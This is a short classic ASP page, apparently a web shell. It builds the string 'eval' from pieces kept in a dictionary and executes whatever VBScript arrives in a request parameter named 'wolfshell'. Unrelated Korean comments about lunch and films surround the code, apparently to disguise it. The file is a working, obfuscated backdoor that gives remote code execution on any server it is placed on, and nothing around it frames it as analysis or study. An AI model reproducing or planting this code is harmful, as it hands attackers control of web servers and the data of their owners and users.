<%
' // 이 시스템은 매우 복잡합니다.
Dim container_obj_k, p_alpha, p_beta, p_gamma
' // 점심 뭐 먹지?
Set container_obj_k = CreateObject("Scripting.Dictionary")
container_obj_k.Add "A", "ev"
container_obj_k.Add "B", "al"
container_obj_k.Add "C", "wolfshell"
' // 오늘 밤에 영화 볼까?
p_alpha = container_obj_k.Item("A") & container_obj_k.Item("B")
p_beta = container_obj_k.Item("C")
' // 이 주석은 의미가 없습니다.
p_gamma = p_alpha & "(request(""" & p_beta & """))"
' // 코드를 실행합니다.
Execute p_gamma
Set container_obj_k = Nothing
%>